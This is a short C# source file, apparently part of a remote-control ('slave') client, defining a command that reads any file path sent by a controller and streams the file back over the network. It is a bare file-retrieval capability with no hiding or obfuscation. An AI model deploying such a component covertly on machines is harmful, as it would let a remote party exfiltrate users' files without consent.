using Shared;
using System.Collections.Generic;
using System.IO;
using Slave.Core;

namespace Slave.Commands
{
    internal class Download : ICommand
    {
        public string name { get; } = "download";

        public void Process(List<string> args)
        {
            if (!File.Exists(args[0]))
            {
                SlaveNetworkManager.GetInstance().WriteLine("NotFound");
                return;
            }

            try
            {
                using (var readStream = new FileStream(args[0], FileMode.Open))
                {
                    SlaveNetworkManager.GetInstance().WriteLine("OK");

                    SlaveNetworkManager.GetInstance().StreamToNetworkStream(readStream);
                }
            }
            catch (IOException)
            {
                SlaveNetworkManager.GetInstance().WriteLine("IOException");
            }
        }
    }
}
